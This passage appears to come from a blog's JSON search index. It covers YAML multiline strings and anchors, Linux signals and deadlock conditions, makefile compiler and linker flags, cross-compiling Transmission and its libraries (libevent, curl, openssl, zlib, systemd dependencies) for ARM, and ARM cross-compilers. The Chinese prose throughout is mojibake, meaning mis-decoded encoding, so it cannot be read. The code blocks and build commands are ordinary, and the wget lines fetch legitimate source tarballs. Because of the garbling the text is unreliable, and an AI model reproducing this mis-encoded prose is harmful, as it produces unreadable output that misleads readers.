è¿™æ˜¯ä¸€æ®µ\n  å¤šè¡Œ\n  å­—ç¬¦ä¸²\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ str: 'è¿™æ˜¯ä¸€æ®µ å¤šè¡Œ å­—ç¬¦ä¸²' }\n```\n\n\n\nå¤šè¡Œå­—ç¬¦ä¸²å¯ä»¥ä½¿ç”¨`|`ä¿ç•™æ¢è¡Œç¬¦ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨`>`æŠ˜å æ¢è¡Œã€‚\n\n```javascript\nthis: |\n  Foo\n  Bar\nthat: >\n  Foo\n  Bar\n```\n\nè½¬ä¸º JavaScript ä»£ç å¦‚ä¸‹ã€‚\n\n```javascript\n{ this: 'Foo\\nBar\\n', that: 'Foo Bar\\n' }\n```\n\n\n\n`+`è¡¨ç¤ºä¿ç•™æ–‡å­—å—æœ«å°¾çš„æ¢è¡Œï¼Œ`-`è¡¨ç¤ºåˆ é™¤å­—ç¬¦ä¸²æœ«å°¾çš„æ¢è¡Œã€‚\n\n```javascript\ns1: |\n  Foo\n\ns2: |+\n  Foo\n\n\ns3: |-\n  Foo\n```\n\nè½¬ä¸º JavaScript ä»£ç å¦‚ä¸‹ã€‚\n\n```javascript\n{ s1: 'Foo\\n', s2: 'Foo\\n\\n\\n', s3: 'Foo' }\n```\n\n\n\nå­—ç¬¦ä¸²ä¹‹ä¸­å¯ä»¥æ’å…¥ HTML æ ‡è®°ã€‚\n\n```javascript\nmessage: |\n\n  <p style=\"color: red\">\n    æ®µè½\n  </p>\n```\n\nè½¬ä¸º JavaScript å¦‚ä¸‹ã€‚\n\n```javascript\n{ message: '\\n<p style=\"color: red\">\\n  æ®µè½\\n</p>\\n' }\n```\n\n\n\n#### å¼•ç”¨\n\né”šç‚¹`&`å’Œåˆ«å`*`ï¼Œå¯ä»¥ç”¨æ¥å¼•ç”¨ã€‚\n\n```javascript\ndefaults: &defaults\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  <<: *defaults\n\ntest:\n  database: myapp_test\n  <<: *defaults\n```\n\nç­‰åŒäºä¸‹é¢çš„ä»£ç ã€‚\n\n```javascript\ndefaults:\n  adapter:  postgres\n  host:     localhost\n\ndevelopment:\n  database: myapp_development\n  adapter:  postgres\n  host:     localhost\n\ntest:\n  database: myapp_test\n  adapter:  postgres\n  host:     localhost\n```\n\n`&`ç”¨æ¥å»ºç«‹é”šç‚¹ï¼ˆ`defaults`ï¼‰ï¼Œ`<<`è¡¨ç¤ºåˆå¹¶åˆ°å½“å‰æ•°æ®ï¼Œ`*`ç”¨æ¥å¼•ç”¨é”šç‚¹ã€‚\n\n\n\nä¸‹é¢æ˜¯å¦ä¸€ä¸ªä¾‹å­ã€‚\n\n```javascript\n- &showell Steve \n- Clark \n- Brian \n- Oren \n- *showell \n```\n\nè½¬ä¸º JavaScript ä»£ç å¦‚ä¸‹ã€‚\n\n```javascript\n[ 'Steve', 'Clark', 'Brian', 'Oren', 'Steve' ]\n```\n\n\n\n## YAMLå®ç»ƒ\n\nhttp://nodeca.github.io/js-yaml/\n","tags":["yaml"],"categories":["è®¡ç®—æœºåŸºç¡€"]},{"title":"linuxä¿¡å·å’Œé”","url":"%2Fp%2F572d7368.html","content":"\n# 1. ä¿¡å·\n\n### 1.1 äº§ç”Ÿä¿¡å·çš„æ¡ä»¶\n\n- ç”¨æˆ·åœ¨ç»ˆç«¯æŒ‰ä¸‹æŸäº›é”®æ—¶ï¼Œç»ˆç«¯é©±åŠ¨ç¨‹åºä¼šå‘é€ä¿¡å·ç»™å‰å°è¿›ç¨‹ï¼Œä¾‹å¦‚Ctrl-Cäº§ç”Ÿ`SIGINT`ä¿¡å·ï¼ŒCtrl-\\äº§ç”Ÿ`SIGQUIT`ä¿¡å·ï¼ŒCtrl-Zäº§ç”Ÿ`SIGTSTP`ä¿¡å·ã€‚\n- ç¡¬ä»¶å¼‚å¸¸äº§ç”Ÿä¿¡å·ï¼Œè¿™äº›æ¡ä»¶ç”±ç¡¬ä»¶æ£€æµ‹åˆ°å¹¶é€šçŸ¥å†…æ ¸ï¼Œç„¶åå†…æ ¸å‘å½“å‰è¿›ç¨‹å‘é€é€‚å½“çš„ä¿¡å·ã€‚ä¾‹å¦‚å½“å‰è¿›ç¨‹æ‰§è¡Œäº†é™¤ä»¥0çš„æŒ‡ä»¤ï¼ŒCPUçš„è¿ç®—å•å…ƒä¼šäº§ç”Ÿå¼‚å¸¸ï¼Œå†…æ ¸å°†è¿™ä¸ªå¼‚å¸¸è§£é‡Šä¸º`SIGFPE`ä¿¡å·å‘é€ç»™è¿›ç¨‹ã€‚å†æ¯”å¦‚å½“å‰è¿›ç¨‹è®¿é—®äº†éæ³•å†…å­˜åœ°å€ï¼Œï¼ŒMMUä¼šäº§ç”Ÿå¼‚å¸¸ï¼Œå†…æ ¸å°†è¿™ä¸ªå¼‚å¸¸è§£é‡Šä¸º`SIGSEGV`ä¿¡å·å‘é€ç»™è¿›ç¨‹ã€‚\n- ä¸€ä¸ªè¿›ç¨‹è°ƒç”¨`kill(2)`å‡½æ•°å¯ä»¥å‘é€ä¿¡å·ç»™å¦ä¸€ä¸ªè¿›ç¨‹ã€‚\n- å¯ä»¥ç”¨`kill(1)`å‘½ä»¤å‘é€ä¿¡å·ç»™æŸä¸ªè¿›ç¨‹ï¼Œ`kill(1)`å‘½ä»¤ä¹Ÿæ˜¯è°ƒç”¨`kill(2)`å‡½æ•°å®ç°çš„ï¼Œå¦‚æœä¸æ˜ç¡®æŒ‡å®šä¿¡å·åˆ™å‘é€`SIGTERM`ä¿¡å·ï¼Œè¯¥ä¿¡å·çš„é»˜è®¤å¤„ç†åŠ¨ä½œæ˜¯ç»ˆæ­¢è¿›ç¨‹ã€‚\n- å½“å†…æ ¸æ£€æµ‹åˆ°æŸç§è½¯ä»¶æ¡ä»¶å‘ç”Ÿæ—¶ä¹Ÿå¯ä»¥é€šè¿‡ä¿¡å·é€šçŸ¥è¿›ç¨‹ï¼Œä¾‹å¦‚é—¹é’Ÿè¶…æ—¶äº§ç”Ÿ`SIGALRM`ä¿¡å·ï¼Œå‘è¯»ç«¯å·²å…³é—­çš„ç®¡é“å†™æ•°æ®æ—¶äº§ç”Ÿ`SIGPIPE`ä¿¡å·ã€‚\n\n<!-- more -->\n\n### 1.2 å¤„ç†ä¿¡å·\n\nå¦‚æœä¸æƒ³æŒ‰é»˜è®¤åŠ¨ä½œå¤„ç†ä¿¡å·ï¼Œç”¨æˆ·ç¨‹åºå¯ä»¥è°ƒç”¨`sigaction(2)`å‡½æ•°å‘Šè¯‰å†…æ ¸å¦‚ä½•å¤„ç†æŸç§ä¿¡å·ï¼ˆ`sigaction`å‡½æ•°ç¨åè¯¦ç»†ä»‹ç»ï¼‰ï¼Œå¯é€‰çš„å¤„ç†åŠ¨ä½œæœ‰ä»¥ä¸‹ä¸‰ç§ï¼š\n\n1. å¿½ç•¥æ­¤ä¿¡å·ã€‚\n2. æ‰§è¡Œè¯¥ä¿¡å·çš„é»˜è®¤å¤„ç†åŠ¨ä½œã€‚\n3. æä¾›ä¸€ä¸ªä¿¡å·å¤„ç†å‡½æ•°ï¼Œè¦æ±‚å†…æ ¸åœ¨å¤„ç†è¯¥ä¿¡å·æ—¶åˆ‡æ¢åˆ°ç”¨æˆ·æ€æ‰§è¡Œè¿™ä¸ªå¤„ç†å‡½æ•°ï¼Œè¿™ç§æ–¹å¼ç§°ä¸ºæ•æ‰ï¼ˆCatchï¼‰ä¸€ä¸ªä¿¡å·ã€‚\n\n# 2. é”\n\n### 2.1 æ­»é”\n\nå½“ä¸¤ä¸ªçº¿ç¨‹ä¸ºäº†ä¿æŠ¤ä¸¤ä¸ªä¸åŒçš„å…±äº«èµ„æºè€Œä½¿ç”¨äº†ä¸¤ä¸ªäº’æ–¥é”ï¼Œé‚£ä¹ˆè¿™ä¸¤ä¸ªäº’æ–¥é”åº”ç”¨ä¸å½“çš„æ—¶å€™ï¼Œå¯èƒ½ä¼šé€ æˆä¸¤ä¸ªçº¿ç¨‹éƒ½åœ¨ç­‰å¾…å¯¹æ–¹é‡Šæ”¾é”ï¼Œåœ¨æ²¡æœ‰å¤–åŠ›çš„ä½œç”¨ä¸‹ï¼Œè¿™äº›çº¿ç¨‹ä¼šä¸€ç›´ç›¸äº’ç­‰å¾…ï¼Œå°±æ²¡åŠæ³•ç»§ç»­è¿è¡Œï¼Œè¿™ç§æƒ…å†µå°±æ˜¯å‘ç”Ÿäº†æ­»é”ã€‚\n\n##### 1. äº§ç”Ÿæ¡ä»¶\n\n1. äº’æ–¥æ¡ä»¶ï¼šä¸€ä¸ªèµ„æºæ¯æ¬¡åªèƒ½è¢«ä¸€ä¸ªçº¿ç¨‹ä½¿ç”¨ã€‚\n\n   ![img](linuxä¿¡å·å’Œé”/äº’æ–¥æ¡ä»¶.png)\n\n2. æŒæœ‰å¹¶ç­‰å¾…æ¡ä»¶ï¼šä¸€ä¸ªè¿›ç¨‹å› è¯·æ±‚èµ„æºè€Œé˜»å¡æ—¶ï¼Œå¯¹å·²è·å¾—çš„èµ„æºä¿æŒä¸æ”¾ã€‚\n\n   ![img](linuxä¿¡å·å’Œé”/æŒæœ‰å¹¶ç­‰å¾…æ¡ä»¶.png)\n\n3. ä¸å‰¥å¤ºæ¡ä»¶ï¼šè¿›ç¨‹å·²è·å¾—çš„èµ„æºï¼Œåœ¨æœªä½¿ç”¨å®Œä¹‹å‰ï¼Œä¸èƒ½å¼ºè¡Œå‰¥å¤ºã€‚\n\n   ![img](linuxä¿¡å·å’Œé”/ä¸å¯å‰¥å¤ºæ¡ä»¶.png)\n\n4. ç¯è·¯ç­‰å¾…æ¡ä»¶ï¼šè‹¥å¹²è¿›ç¨‹ä¹‹é—´å½¢æˆä¸€ç§å¤´å°¾ç›¸æ¥çš„å¾ªç¯ç­‰å¾…èµ„æºå…³ç³»ã€‚\n\n   ![img](linuxä¿¡å·å’Œé”/ç¯è·¯ç­‰å¾…æ¡ä»¶.png)\n\nåªè¦ç ´åæ­»é” 4 ä¸ªå¿…è¦æ¡ä»¶ä¹‹ä¸€ä¸­çš„ä»»ä½•ä¸€ä¸ªï¼Œæ­»é”é—®é¢˜å°±èƒ½è¢«è§£å†³ã€‚\n\n##### 2. è§£æ”¾æ–¹æ¡ˆ\n\né¿å…æ­»é”é—®é¢˜å°±åªéœ€è¦ç ´ç¯å…¶ä¸­ä¸€ä¸ªæ¡ä»¶å°±å¯ä»¥ï¼Œæœ€å¸¸è§çš„å¹¶ä¸”å¯è¡Œçš„å°±æ˜¯ä½¿ç”¨èµ„æºæœ‰åºåˆ†é…æ³•ï¼Œæ¥ç ´ç¯ç¯è·¯ç­‰å¾…æ¡ä»¶ã€‚\n\nçº¿ç¨‹ A å’Œ çº¿ç¨‹ B è·å–èµ„æºçš„é¡ºåºè¦ä¸€æ ·ï¼Œå½“çº¿ç¨‹ A æ˜¯å…ˆå°è¯•è·å–èµ„æº Aï¼Œç„¶åå°è¯•è·å–èµ„æº B çš„æ—¶å€™ï¼Œçº¿ç¨‹ B åŒæ ·ä¹Ÿæ˜¯å…ˆå°è¯•è·å–èµ„æº Aï¼Œç„¶åå°è¯•è·å–èµ„æº Bã€‚æ‰€ä»¥æˆ‘ä»¬åªéœ€å°†çº¿ç¨‹ B æ”¹æˆä»¥ç›¸åŒé¡ºåºçš„è·å–èµ„æºï¼Œå°±å¯ä»¥æ‰“ç ´æ­»é”äº†ã€‚\n\n\n\n# 3. å‚è€ƒèµ„æ–™\n\n+ https://akaedu.github.io/book/ ï¼ˆLinux Cç¼–ç¨‹ä¸€ç«™å¼å­¦ä¹ ï¼‰\n+ https://www.cnblogs.com/crazymakercircle/p/14323919.html\n+ https://xiaolincoding.com/os/4_process/deadlock.html\n\n","tags":["linux"],"categories":["ç³»ç»Ÿ"]},{"title":"makefileçš„é€‰é¡¹CFLAGSã€CPPFLAGSã€LDFLAGSå’ŒLIBSçš„åŒºåˆ«","url":"%2Fp%2F271bdf2a.html","content":"\n\n\nå…ˆçœ‹ä¸€ä¸ªä¾‹å­:\n\n```shell\nexport CFLAGS=\"-I/root/ARM/opt/include\"\nexport LDFLAGS=\"-L/root/ARM/opt/lib\"\n```\n\n\n\n**CFLAGS**ï¼š æŒ‡å®šå¤´æ–‡ä»¶ï¼ˆ.hæ–‡ä»¶ï¼‰çš„è·¯å¾„ï¼Œå¦‚ï¼šCFLAGS=-I/usr/include -I/path/includeã€‚åŒæ ·åœ°ï¼Œå®‰è£…ä¸€ä¸ªåŒ…æ—¶ä¼šåœ¨å®‰è£…è·¯å¾„ä¸‹å»ºç«‹ä¸€ä¸ªincludeç›®å½•ï¼Œå½“å®‰è£…è¿‡ç¨‹ä¸­å‡ºç°é—®é¢˜æ—¶ï¼Œè¯•ç€æŠŠä»¥å‰å®‰è£…çš„åŒ…çš„includeç›®å½•åŠ å…¥åˆ°è¯¥å˜é‡ä¸­æ¥ã€‚\n\n**LDFLAGS**ï¼šgcc ç­‰ç¼–è¯‘å™¨ä¼šç”¨åˆ°çš„ä¸€äº›ä¼˜åŒ–å‚æ•°ï¼Œä¹Ÿå¯ä»¥åœ¨é‡Œé¢æŒ‡å®šåº“æ–‡ä»¶çš„ä½ç½®ã€‚ç”¨æ³•ï¼šLDFLAGS=-L/usr/lib -L/path/to/your/libã€‚æ¯å®‰è£…ä¸€ä¸ªåŒ…éƒ½å‡ ä¹ä¸€å®šçš„ä¼šåœ¨å®‰è£…ç›®å½•é‡Œå»ºç«‹ä¸€ä¸ªlibç›®å½•ã€‚å¦‚æœæ˜æ˜å®‰è£…äº†æŸä¸ªåŒ…ï¼Œè€Œå®‰è£…å¦ä¸€ä¸ªåŒ…æ—¶ï¼Œå®ƒæ„£æ˜¯è¯´æ‰¾ä¸åˆ°ï¼Œå¯ä»¥æŠ’é‚£ä¸ªåŒ…çš„libè·¯å¾„åŠ å…¥çš„LDFALGSä¸­è¯•ä¸€ä¸‹ã€‚\n\n**LIBS**ï¼šå‘Šè¯‰é“¾æ¥å™¨è¦é“¾æ¥å“ªäº›åº“æ–‡ä»¶ï¼Œå¦‚LIBS = -lpthread -liconv\n\n<!-- more -->\n\n### CFLAGS,CXXFLAGS,CPPFLAGSçš„åŒºåˆ«\n\nCFLAGS è¡¨ç¤ºç”¨äº C ç¼–è¯‘å™¨çš„é€‰é¡¹\n\nCXXFLAGS è¡¨ç¤ºç”¨äº C++ ç¼–è¯‘å™¨çš„é€‰é¡¹ã€‚\n\nCPPFLAGS å¯ä»¥ ç”¨äº C å’Œ C++ ä¸¤è€…ã€‚\n\n\n\n### LDFLAGS,LIBSçš„åŒºåˆ«\n\nLDFLAGSæ˜¯é€‰é¡¹ï¼ŒLIBSæ˜¯è¦é“¾æ¥çš„åº“ã€‚éƒ½æ˜¯å–‚ç»™ldçš„ï¼Œåªä¸è¿‡ä¸€ä¸ªæ˜¯å‘Šè¯‰ldæ€ä¹ˆåƒï¼Œä¸€ä¸ªæ˜¯å‘Šè¯‰ldè¦åƒä»€ä¹ˆã€‚\n\nçœ‹çœ‹å¦‚ä¸‹é€‰é¡¹ï¼š\n\n```shell\nLDFLAGS = -L/var/xxx/lib -L/opt/mysql/lib\nLIBS = -lmysqlclient -liconv\n```\n\nè¿™å°±æ˜ç™½äº†ã€‚LDFLAGSå‘Šè¯‰é“¾æ¥å™¨ä»å“ªé‡Œå¯»æ‰¾åº“æ–‡ä»¶ï¼ŒLIBSå‘Šè¯‰é“¾æ¥å™¨è¦é“¾æ¥å“ªäº›åº“æ–‡ä»¶ã€‚ä¸è¿‡ä½¿ç”¨æ—¶é“¾æ¥é˜¶æ®µè¿™ä¸¤ä¸ªå‚æ•°éƒ½ä¼šåŠ ä¸Šï¼Œæ‰€ä»¥ä½ å³ä½¿å°†è¿™ä¸¤ä¸ªçš„å€¼äº’æ¢ï¼Œä¹Ÿæ²¡æœ‰é—®é¢˜ã€‚\n\n\n\nè¯´åˆ°è¿™é‡Œï¼Œè¿›ä¸€æ­¥è¯´è¯´LDFLAGSæŒ‡å®š-Lè™½ç„¶èƒ½è®©é“¾æ¥å™¨æ‰¾åˆ°åº“è¿›è¡Œé“¾æ¥ï¼Œä½†æ˜¯è¿è¡Œæ—¶é“¾æ¥å™¨å´æ‰¾ä¸åˆ°è¿™ä¸ªåº“ï¼Œå¦‚æœè¦è®©è½¯ä»¶è¿è¡Œæ—¶åº“æ–‡ä»¶çš„è·¯å¾„ä¹Ÿå¾—åˆ°æ‰©å±•ï¼Œé‚£ä¹ˆæˆ‘ä»¬éœ€è¦å¢åŠ è¿™ä¸¤ä¸ªåº“ç»™\"-Wl,R\"\n\n```\nLDFLAGS = -L/var/xxx/lib -L/opt/mysql/lib -Wl,R/var/xxx/lib -Wl,R/opt/mysql/lib\n```\n\nå¦‚ æœåœ¨æ‰§è¡Œ./configureä»¥å‰è®¾ç½®ç¯å¢ƒå˜é‡export LDFLAGS=\"-L/var/xxx/lib -L/opt/mysql/lib -Wl,R/var/xxx/lib -Wl,R/opt/mysql/lib\" ï¼Œæ³¨æ„è®¾ç½®ç¯å¢ƒå˜é‡ç­‰å·ä¸¤è¾¹ä¸å¯ä»¥æœ‰ç©ºæ ¼ï¼Œè€Œä¸”è¦åŠ ä¸Šå¼•å·å“¦ï¼ˆshellçš„ç”¨æ³•ï¼‰ã€‚æ‰§è¡Œconfigureä»¥åï¼ŒMakefileå°†ä¼šè®¾ç½®è¿™ä¸ªé€‰é¡¹ï¼Œ é“¾æ¥æ—¶ä¼šæœ‰è¿™ä¸ªå‚æ•°ï¼Œç¼–è¯‘å‡ºæ¥çš„å¯æ‰§è¡Œç¨‹åºçš„åº“æ–‡ä»¶æœç´¢è·¯å¾„å°±å¾—åˆ°æ‰©å±•äº†ã€‚\n\n\n\n### å‚è€ƒé“¾æ¥:\n\nhttps://forum.golangbridge.org/t/cflags-ldflags-documentation-somewhere/4520/10","tags":["makefile"],"categories":["ç³»ç»Ÿ"]},{"title":"äº¤å‰ç¼–è¯‘arm-transmission-2.94","url":"%2Fp%2F73da9612.html","content":"\n\n\n# 1. ç¼–è¯‘å¹³å°å‡†å¤‡å·¥ä½œ\n\n1. ä¸‹è½½arm-none-linux-gnueabi-gcc\n\n2. ä¸‹è½½transmission-2.94\n\n3. æ–°å»ºARMæ–‡ä»¶å¤¹\n\n4. è§£å‹arm-none-linux-gnueabi-gccå’Œtransmission-2.94åˆ°ARMæ–‡ä»¶å¤¹\n\n5. è®¾ç½®ç¼–è¯‘å¹³å°ç¯å¢ƒå˜é‡\n\n   ```shell\n   export PATH=\"/root/ARM/external-toolchain/bin:$PATH\"\n   export cross=arm-none-linux-gnueabi-\n   export CC=\"${cross}gcc\"\n   ```\n\n6. ç¼–è¯‘çš„æ—¶å€™ä¸€å®šè¦æ³¨æ„çœ‹log, æ˜¯arm-none-linux-gnueabi-gccç¼–è¯‘çš„æ‰æ˜¯æ­£ç¡®çš„\n\n<!-- more -->\n\n\n\n# 2. ç›®æ ‡å¹³å°å¼€å§‹ç¼–è¯‘\n\n### 2.1 transmission\n\n```shell\n./configure --host=\"arm-none-linux-gnueabi\" --prefix=/usr/local --without-gtk --without-systemd_daemon  --disable-mac --enable-utp --disable-nls  --enable-utp --enable-lightweight --disable-cli --enable-daemon  PKG_CONFIG=\"/usr/bin/pkg-config\" PKG_CONFIG_PATH=\"/root/ARM/opt/lib/pkgconfig\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install DESTDIR=/root/ARM/transmission-2.94/a(ç»å¯¹è·¯å¾„)\n```\n\n\n\ngit cloneä¸‹æ¥çš„éœ€è¦æ‰§è¡Œ./autogen.sh\n\n```shell\n./autogen.sh --host=\"arm-none-linux-gnueabi\" --prefix=/usr/local --without-gtk --without-systemd  --disable-mac --enable-utp --disable-nls  --enable-utp --enable-lightweight --disable-cli --enable-daemon  PKG_CONFIG=\"/usr/bin/pkg-config\" PKG_CONFIG_PATH=\"/root/ARM/opt/lib/pkgconfig\" \n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install DESTDIR=/root/transmission/a(ç»å¯¹è·¯å¾„)\n```\n\n\n\né”™è¯¯1. å‡ºç°No package 'libevent' found ->å®‰è£…libevent\n\né”™è¯¯2. fatal error: curl/curl.h: No such file or directory -> å®‰è£…curl\n\né”™è¯¯3. rpcimpl.c:16:18: fatal error: zlib.h: No such file or directory ->å®‰è£…zlib\n\né”™è¯¯4. fatal error: systemd/sd-daemon.h: No such file or directory ->éœ€è¦å®‰è£…systemd, æ­¤å¤„å¼ºçƒˆå»ºè®®ä½¿ç”¨`--without-systemd_daemon`é€‰é¡¹, å¦åˆ™ç¼–è¯‘systemdåˆæ˜¯ä¸€å †ä¾èµ–\n\n\n\n### 2.2 libevent\n\n```shell\nwget https://github.com/downloads/libevent/libevent/libevent-2.0.21-stable.tar.gz\ncd libevent-2.0.21-stable\n./configure --host=\"arm-none-linux-gnueabi\" --prefix=\"/root/ARM/opt/\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n### 2.3 libcurl\n\n```shell\nwget https://curl.haxx.se/download/curl-7.61.1.tar.gz\ntar zxvf curl-7.61.1.tar.gz\ncd curl-7.61.1\n./configure --prefix=\"/root/ARM/opt/\" --target=arm-none-linux-gnueabi --host=arm-none-linux-gnueabi --with-zlib=\"/root/ARM/opt\" --with-ssl=\"/root/ARM/opt\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\né”™è¯¯1. configure: error: /root/ARM/opt is a bad --with-ssl prefix! -> å®‰è£…openssl\n\n\n\n### 2.4 openssl\n\n```shell\nwget https://www.openssl.org/source/openssl-1.1.1.tar.gz\ntar zxvf openssl-1.1.1.tar.gz\ncd openssl-1.1.1\n./Configure linux-generic32 shared  -DL_ENDIAN --prefix=/root/ARM/opt --openssldir=/root/ARM/opt\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\" MAKEDEPPROG=\"${cross}gcc\" PROCESSOR=ARM\nmake install\n```\n\n\n\n### 2.5 zlib\n\n```shell\nwget http://zlib.net/zlib-1.2.11.tar.gz\ntar zxvf zlib-1.2.11.tar.gz\ncd zlib-1.2.11\n./configure --prefix=\"/root/ARM/opt\"\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\n\n\n# 3. ç¼–è¯‘systemd\n\nå‚è€ƒ: https://wiki.beyondlogic.org/index.php?title=Cross_Compiling_SystemD_for_ARM\n\n#### 1. libkmod\n\n```shell\nwget https://www.kernel.org/pub/linux/utils/kernel/kmod/kmod-17.tar.gz\n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/ \n\nmake \nmake install \n```\n\n#### 2. libffi\n\n```shell\nwget https://sourceware.org/ftp/libffi/libffi-3.2.1.tar.gz\n./configure --prefix=/root/ARM/opt/  CC=arm-none-linux-gnueabi-gcc --host=arm-none-linux-gnueabi   \n\nmake\nmake install\n```\n\n#### 3. pcre\n\n```shell\nwget ftp://ftp.csx.cam.ac.uk/pub/software/programming/pcre/pcre-8.42.tar.gz\n./configure --prefix=/root/ARM/opt/ --host=arm-none-linux-gnueabi   CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\"\n\nmake\nmake install\n```\n\n#### 4. libattr\n\n```shell\nwget https://download-mirror.savannah.gnu.org/releases/attr/attr-2.4.48.tar.gz\n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/\n\nmake CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\" \nmake install\n```\n\n#### 5. libcap\n\n```shell\nwget https://www.kernel.org/pub/linux/libs/security/linux-privs/libcap2/libcap-2.24.tar.xz \nmake prefix=/root/ARM/opt/  BUILD_CC=gcc  CC=\"${cross}gcc\" AR=\"${cross}ar\" RANLIB=\"${cross}ranlib\" LD=\"${cross}ld\"\nmake install\n```\n\nmakeä¸æˆåŠŸä¿®æ”¹æ–‡ä»¶:\n\n```shell\nvi libcap/cap_file.c\n\n-#ifdef VFS_CAP_U32\n+#if defined (VFS_CAP_U32) && defined (XATTR_NAME_CAPS)\n```\n\n#### 6. glibc(æ²¡æœ‰æˆåŠŸ....)\n\n```shell\nwget http://ftp.gnome.org/pub/gnome/sources/glib/2.52/glib-2.52.3.tar.xz\n\nexport glib_cv_stack_grows=no; \\\nexport glib_cv_uscore=no; \\\nexport ac_cv_func_posix_getpwuid_r=no; \\\nexport ac_cv_func_posix_getgrgid_r=no; \\\nCFLAGS=-I/root/ARM/opt/include \\\nLDFLAGS=-L/root/ARM/opt/lib \\\n\n \n./configure --host=arm-none-linux-gnueabi --prefix=/root/ARM/opt/ --disable-libmount\n```\n\n\n\n# 4. ç›®æ ‡å¹³å°è¿è¡Œ\n\n+ systemdç¼–è¯‘å¤±è´¥, å¯åœ¨ç¼–è¯‘transmissionçš„æ—¶å€™å»æ‰systemd\n\n+ ç›®æ ‡å¹³å°æ‰§è¡Œtransmissionçš„ç¯å¢ƒå˜é‡(å¯å¿½ç•¥)\n\n```shell\nexport PATH=/dev/opt/bin:$PATH\nexport LD_LIBRARY_PATH=/dev/opt/lib:$LD_LIBRARY_PATH\nexport CURL_CA_BUNDLE=/mnt/Sync2/ca.crt\nexport TR_CURL_SSL_CERT=/mnt/Sync2/cert.pem\nexport TR_CURL_SSL_CERT=/mnt/Sync2/cert.pem\nexport TR_CURL_SSL_KEY=/mnt/Sync2/key.pem\nexport STNOUPGRADE=1\n```\n\n\n\n# 5. å‚è€ƒèµ„æ–™\n\n+ https://wiki.beyondlogic.org/index.php?title=Cross_Compiling_SystemD_for_ARM","tags":["transmission"],"categories":["bittorrent"]},{"title":"armäº¤å‰ç¼–è¯‘å™¨çš„åŒºåˆ«","url":"%2Fp%2Fa63b0191.html","content":"\n\n\n## ä¸ºä»€ä¹ˆè¦ç”¨äº¤å‰ç¼–è¯‘å™¨ï¼Ÿ\n\näº¤å‰ç¼–è¯‘é€šä¿—åœ°è®²å°±æ˜¯åœ¨ä¸€ç§å¹³å°ä¸Šç¼–è¯‘å‡ºèƒ½è¿è¡Œåœ¨ä½“ç³»ç»“æ„ä¸åŒçš„å¦ä¸€ç§å¹³å°ä¸Šçš„ç¨‹åºï¼Œæ¯”å¦‚åœ¨PCå¹³å°ï¼ˆX86 CPUï¼‰ä¸Šç¼–è¯‘å‡ºèƒ½è¿è¡Œåœ¨ä»¥ARMä¸ºå†…æ ¸çš„CPUå¹³å°ä¸Šçš„ç¨‹åºï¼Œç¼–è¯‘å¾—åˆ°çš„ç¨‹åºåœ¨X86 CPUå¹³å°ä¸Šæ˜¯ä¸èƒ½è¿è¡Œçš„ï¼Œå¿…é¡»æ”¾åˆ°ARM CPUå¹³å°ä¸Šæ‰èƒ½è¿è¡Œï¼Œè™½ç„¶ä¸¤ä¸ªå¹³å°ç”¨çš„éƒ½æ˜¯Linuxç³»ç»Ÿã€‚\n\näº¤å‰ç¼–è¯‘å·¥å…·é“¾æ˜¯ä¸€ä¸ªç”±ç¼–è¯‘å™¨ã€è¿æ¥å™¨å’Œè§£é‡Šå™¨ç»„æˆçš„ç»¼åˆå¼€å‘ç¯å¢ƒï¼Œäº¤å‰ç¼–è¯‘å·¥å…·é“¾ä¸»è¦ç”±binutilsã€gccå’Œglibcä¸‰ä¸ªéƒ¨åˆ†ç»„æˆã€‚æœ‰æ—¶å‡ºäºå‡å° libc åº“å¤§å°çš„è€ƒè™‘ï¼Œä¹Ÿå¯ä»¥ç”¨åˆ«çš„ c åº“æ¥ä»£æ›¿ glibcï¼Œä¾‹å¦‚ uClibcã€dietlibc å’Œ newlibã€‚\n\nå»ºç«‹äº¤å‰ç¼–è¯‘å·¥å…·é“¾æ˜¯ä¸€ä¸ªç›¸å½“å¤æ‚çš„è¿‡ç¨‹ï¼Œå¦‚æœä¸æƒ³è‡ªå·±ç»å†å¤æ‚ç¹ççš„ç¼–è¯‘è¿‡ç¨‹ï¼Œç½‘ä¸Šæœ‰ä¸€äº›ç¼–è¯‘å¥½çš„å¯ç”¨çš„äº¤å‰ç¼–è¯‘å·¥å…·é“¾å¯ä»¥ä¸‹è½½ï¼Œä½†å°±ä»¥å­¦ä¹ ä¸ºç›®çš„æ¥è¯´è¯»è€…æœ‰å¿…è¦å­¦ä¹ è‡ªå·±åˆ¶ä½œä¸€ä¸ªäº¤å‰ç¼–è¯‘å·¥å…·é“¾ï¼ˆç›®å‰æ¥çœ‹ï¼Œå¯¹äºåˆå­¦è€…æ²¡æœ‰å¤ªå¤§å¿…è¦è‡ªå·±äº¤å‰ç¼–è¯‘ä¸€ä¸ªå·¥å…·é“¾ï¼‰ã€‚\n\n<!-- more -->\n\n## åˆ†ç±»å’Œè¯´æ˜\n\nä»æˆæƒä¸Šï¼Œåˆ†ä¸ºå…è´¹æˆæƒç‰ˆå’Œä»˜è´¹æˆæƒç‰ˆã€‚\n\nå…è´¹ç‰ˆç›®å‰æœ‰ä¸‰å¤§ä¸»æµå·¥å…·å•†æä¾›ï¼Œç¬¬ä¸€æ˜¯GNUï¼ˆæä¾›æºç 